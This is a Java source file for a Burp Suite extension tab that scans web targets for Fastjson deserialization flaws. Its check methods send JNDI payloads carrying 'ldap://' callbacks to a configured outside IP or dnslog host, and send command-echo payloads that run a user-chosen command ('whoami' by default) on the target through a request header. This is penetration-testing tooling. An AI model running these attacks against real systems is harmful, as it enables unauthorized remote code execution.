package burp.ui;

import burp.*;
import burp.bean.FastjsonBean;
import burp.utils.CustomScanIssue;
import burp.utils.JsonUtils;
import burp.utils.Utils;

import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.TableColumnModel;
import javax.swing.table.TableModel;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

import static burp.dao.ConfigDao.getConfig;
import static burp.dao.FastjsonDao.getFastjsonListsByType;

/**
 * @Author Xm17
 * @Date 2024-06-22 12:13
 */
public class FastjsonUI implements UIHandler, IMessageEditorController {
    private JPanel panel; // 主面板
    private JTabbedPane fastjsonreq; // 请求面板
    private JTabbedPane fastjsonresp; // 响应面板
    private JButton btnClear; // 清空按钮
    private static JTable fastjsonTable; // fastjson表格
    private IHttpRequestResponse currentlyDisplayedItem; // 当前显示的请求
    private IMessageEditor HRequestTextEditor; // 请求编辑器
    private IMessageEditor HResponseTextEditor; // 响应编辑器
    private static final List<FastjsonEntry> fastjsonlog = new ArrayList<>(); // fastjson日志
    public static String dnslog; // dnslog地址
    public static String ip; // ip地址
    private static List<FastjsonBean> jndiPayloads = new ArrayList<>(); // jndi payloads
    private static List<FastjsonBean> versionPayloads = new ArrayList<>(); // jndi payloads
    private static List<FastjsonBean> dnsPayloads = new ArrayList<>(); // jndi payloads
    private static List<FastjsonBean> echoPayloads = new ArrayList<>(); // jndi payloads
    private static final Lock lock = new ReentrantLock();


    @Override
    public IHttpService getHttpService() {
        return currentlyDisplayedItem.getHttpService();
    }

    @Override
    public byte[] getRequest() {
        return currentlyDisplayedItem.getRequest();
    }

    @Override
    public byte[] getResponse() {
        return currentlyDisplayedItem.getResponse();
    }

    @Override
    public void init() {

        dnslog = getConfig("config", "dnslog").getValue();
        ip = getConfig("config", "ip").getValue();
        jndiPayloads = getFastjsonListsByType("jndi");
        versionPayloads = getFastjsonListsByType("version");
        dnsPayloads = getFastjsonListsByType("dns");
        echoPayloads = getFastjsonListsByType("echo");
        setupUI();
        setupData();
    }

    // 初始化数据
    private void setupData() {
        btnClear.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                fastjsonlog.clear();
                HRequestTextEditor.setMessage(new byte[0], true);
                HResponseTextEditor.setMessage(new byte[0], false);
                fastjsonTable.updateUI();
            }
        });
    }

    // 初始化UI
    private void setupUI() {
        panel = new JPanel();
        panel.setLayout(new BorderLayout());
        // 添加FlowLayout布局,将清空按钮添加
        JPanel topPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        btnClear = new JButton("Clear");
        topPanel.add(btnClear);
        panel.add(topPanel, BorderLayout.NORTH);

        // 上下分割面板,比例是7：3
        JSplitPane mainsplitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
        mainsplitPane.setResizeWeight(0.7);
        mainsplitPane.setDividerLocation(0.7);

        // 添加URLTable到mainsplitPane的上边
        fastjsonTable = new URLTable(new FastjsonModel());
        JScrollPane scrollPane = new JScrollPane(fastjsonTable);
        mainsplitPane.setTopComponent(scrollPane);

        // 创建一个自定义的单元格渲染器
        DefaultTableCellRenderer renderer = new DefaultTableCellRenderer() {
            @Override
            public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
                JLabel label = (JLabel) super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);
                label.setHorizontalAlignment(JLabel.CENTER);
                label.setHorizontalTextPosition(JLabel.CENTER);
                label.setIconTextGap(0);
                label.setMaximumSize(new Dimension(Integer.MAX_VALUE, label.getPreferredSize().height));
                label.setToolTipText((String) value); // 设置鼠标悬停时显示的提示文本
                return label;
            }
        };

        fastjsonTable.getColumnModel().getColumn(5).setCellRenderer(renderer);

        // 左右分割面板,对称分割
        JSplitPane splitPaneDown = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
        splitPaneDown.setResizeWeight(0.5);
        splitPaneDown.setDividerLocation(0.5);
        // 添加请求响应到左右分割面板
        fastjsonreq = new JTabbedPane();
        HRequestTextEditor = Utils.callbacks.createMessageEditor(FastjsonUI.this, true);
        fastjsonreq.addTab("request", HRequestTextEditor.getComponent());

        fastjsonresp = new JTabbedPane();
        HResponseTextEditor = Utils.callbacks.createMessageEditor(FastjsonUI.this, false);
        fastjsonresp.addTab("response", HResponseTextEditor.getComponent());
        splitPaneDown.setLeftComponent(fastjsonreq);
        splitPaneDown.setRightComponent(fastjsonresp);

        // 添加splitPaneDown到mainsplitPane的下边
        mainsplitPane.setBottomComponent(splitPaneDown);

        panel.add(mainsplitPane, BorderLayout.CENTER);

    }

    @Override
    public JPanel getPanel(IBurpExtenderCallbacks callbacks) {
        return panel;
    }

    @Override
    public String getTabName() {
        return "Fastjson";
    }
    // dnslog检测
    public void CheckDnslog(IHttpRequestResponse[] responses) {
        lock.lock();
        try{
            IHttpRequestResponse baseRequestResponse = responses[0];
            IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
            String extensionMethod = analyzeRequest.getMethod();
            String url = analyzeRequest.getUrl().toString();
            List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
            String res = "dnslog检测,请查看dnslog服务器";
            IHttpService iHttpService = baseRequestResponse.getHttpService();
            for (FastjsonBean fastjson : dnsPayloads) {
                String fastjsonDnslog = fastjson.getValue();
                String fuzzPayload = fastjsonDnslog.replace("FUZZ", dnslog);
                String jsonPayload = JsonUtils.encodeToJsonRandom(fuzzPayload);
                byte[] bytePayload = Utils.helpers.stringToBytes(jsonPayload);
                byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
                IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
                IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
                String statusCode = String.valueOf(iResponseInfo.getStatusCode());
                add(extensionMethod, url, statusCode, res, fuzzPayload,resp);
            }
        }finally {
            lock.unlock();
        }

    }

    // echo命令检测
    public void CheckEchoVul(IHttpRequestResponse[] responses) {
        lock.lock();
        try{
            IHttpRequestResponse baseRequestResponse = responses[0];
            IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
            String extensionMethod = analyzeRequest.getMethod();
            String url = analyzeRequest.getUrl().toString();
            List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
            // 弹出一个输入框，用于获取用户输入的dnslog地址
            String defaultValue = "whoami";
            String echoVul = (String) JOptionPane.showInputDialog(null, "请输入echo 命令", "提示", JOptionPane.PLAIN_MESSAGE, null, null, defaultValue);
            if (echoVul == null){
                JOptionPane.showMessageDialog(null, "请输入echo命令", "提示", JOptionPane.ERROR_MESSAGE);
                return;
            }
            IHttpService iHttpService = baseRequestResponse.getHttpService();
            Iterator<FastjsonBean> iterator = echoPayloads.iterator();
            headers.add("Accept-Cache: " + echoVul);
            while (iterator.hasNext()) {
                FastjsonBean fastjson = iterator.next();
                String fastjsonEcho = fastjson.getValue();
                byte[] bytePayload = Utils.helpers.stringToBytes(fastjsonEcho);
                byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
                IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
                IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
                String statusCode = String.valueOf(iResponseInfo.getStatusCode());
                List<String> headersResp = iResponseInfo.getHeaders();
                boolean containsContentAuth = false;
                for (String header : headersResp) {
                    if (header.contains("Content-auth")) {
                        containsContentAuth = true;
                        break;
                    }
                }
                if (containsContentAuth) {
                    add(extensionMethod, url, statusCode, "echo命令检测完成,发现结果",fastjsonEcho, resp);
                    IScanIssue issues = null;
                    try {
                        issues = new CustomScanIssue(iHttpService, new URL(url), new IHttpRequestResponse[]{resp},
                                "Fastjson echo", "Fastjson echo命令检测完成,发现结果",
                                "High", "Certain");
                        Utils.callbacks.addScanIssue(issues);
                    } catch (MalformedURLException e) {
                        throw new RuntimeException(e);
                    }
                } else {
                    add(extensionMethod, url, statusCode, "echo命令检测完成,未发现结果",fastjsonEcho, resp);
                }
            }
        }finally {
            lock.unlock();
        }
    }
    // jndi检测
    public void CheckJNDIVul(IHttpRequestResponse[] responses) {
        lock.lock();
        try {
            IHttpRequestResponse baseRequestResponse = responses[0];
            IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
            String extensionMethod = analyzeRequest.getMethod();
            String url = analyzeRequest.getUrl().toString();
            List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
            try {

                String jndiStr = "";
                String defaultValue = "IP"; // 设置默认值
                String[] options = {"DNS", "IP"}; // 单选框选项
                String selectedValue = (String) JOptionPane.showInputDialog(null, "请选择类型", "提示",
                        JOptionPane.PLAIN_MESSAGE, null, options, defaultValue);
                if (Objects.equals(selectedValue, "DNS")) {
                    jndiStr = dnslog;
                }
                if (Objects.equals(selectedValue, "IP")) {
                    jndiStr = ip;
                }

                IHttpService iHttpService = baseRequestResponse.getHttpService();
                for (FastjsonBean payload : jndiPayloads) {
                    String dnslogKey = "";

                    String fastjsonJNDI = payload.getValue();
                    String id = String.valueOf(payload.getId());
                    if (selectedValue.equals("DNS")) {
                        dnslogKey = "ldap://" + id + "." + jndiStr;
                    } else {
                        dnslogKey = "ldap://" + jndiStr + "/" + id;
                    }
                    String fuzzPayload = fastjsonJNDI.replace("FUZZ", dnslogKey);
                    String jsonPayload = JsonUtils.encodeToJsonRandom(fuzzPayload);
                    byte[] bytePayload = Utils.helpers.stringToBytes(jsonPayload);
                    byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
                    IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
                    IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
                    String statusCode = String.valueOf(iResponseInfo.getStatusCode());
                    add(extensionMethod, url, statusCode, "jndi检测完成,请查看服务器",fuzzPayload, resp);
                }
            } catch (Exception e) {
                Utils.stderr.println(e.getMessage());
            }
        }finally {
            lock.unlock();
        }
    }
    // version检测
    public void CheckVersion(IHttpRequestResponse[] responses) {
        lock.lock();
        try{
            IHttpRequestResponse baseRequestResponse = responses[0];
            IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
            String extensionMethod = analyzeRequest.getMethod();
            String url = analyzeRequest.getUrl().toString();
            List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
            IHttpService iHttpService = baseRequestResponse.getHttpService();
            for (FastjsonBean fastjson : versionPayloads) {
                String fastjsonVersion = fastjson.getValue();
                byte[] bytePayload = Utils.helpers.stringToBytes(fastjsonVersion);
                byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
                IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
                IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
                String statusCode = String.valueOf(iResponseInfo.getStatusCode());
                add(extensionMethod, url, statusCode, "version检测完成,请查看返回包",fastjsonVersion, resp);
            }
        }finally {
            lock.unlock();
        }
    }
    // 添加日志
    private static void add(String extensionMethod, String url, String status, String res,String req, IHttpRequestResponse baseRequestResponse) {
        synchronized (fastjsonlog) {
            int id = fastjsonlog.size();
            fastjsonlog.add(new FastjsonEntry(id, extensionMethod, url, status, res,req, baseRequestResponse));
            fastjsonTable.updateUI();
        }
    }

    private static class FastjsonModel extends AbstractTableModel {

        @Override
        public int getRowCount() {
            return fastjsonlog.size();
        }

        @Override
        public int getColumnCount() {
            return 6;
        }

        @Override
        public Object getValueAt(int rowIndex, int columnIndex) {
            FastjsonEntry logEntry = fastjsonlog.get(rowIndex);
            switch (columnIndex) {
                case 0:
                    return logEntry.id;
                case 1:
                    return logEntry.extensionMethod;
                case 2:
                    return logEntry.url;
                case 3:
                    return logEntry.status;
                case 4:
                    return logEntry.res;
                case 5:
                    return logEntry.req;
                default:
                    return "";
            }
        }

        @Override
        public String getColumnName(int column) {
            switch (column) {
                case 0:
                    return "id";
                case 1:
                    return "method";
                case 2:
                    return "url";
                case 3:
                    return "status";
                case 4:
                    return "res";
                case 5:
                    return "req";
                default:
                    return "";
            }

        }

    }

    private static class FastjsonEntry {
        final int id;
        final String extensionMethod;
        final String url;
        final String status;
        final String res;
        final String req;

        final IHttpRequestResponse requestResponse;


        private FastjsonEntry(int id, String extensionMethod, String url, String status, String res,String req, IHttpRequestResponse requestResponse) {
            this.id = id;
            this.extensionMethod = extensionMethod;
            this.url = url;
            this.status = status;
            this.res = res;
            this.req = req;
            this.requestResponse = requestResponse;
        }
    }

    private class URLTable extends JTable {
        public URLTable(TableModel tableModel) {
            super(tableModel);
            TableColumnModel columnModel = getColumnModel();
            columnModel.getColumn(0).setMaxWidth(50);
            columnModel.getColumn(5).setMaxWidth(250);
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend) {
            FastjsonEntry logEntry = fastjsonlog.get(row);
            HRequestTextEditor.setMessage(logEntry.requestResponse.getRequest(), true);
            if (logEntry.requestResponse.getResponse() == null) {
                HResponseTextEditor.setMessage(new byte[0], false);
            } else {
                HResponseTextEditor.setMessage(logEntry.requestResponse.getResponse(), false);
            }
            currentlyDisplayedItem = logEntry.requestResponse;
            super.changeSelection(row, col, toggle, extend);
        }
    }
}
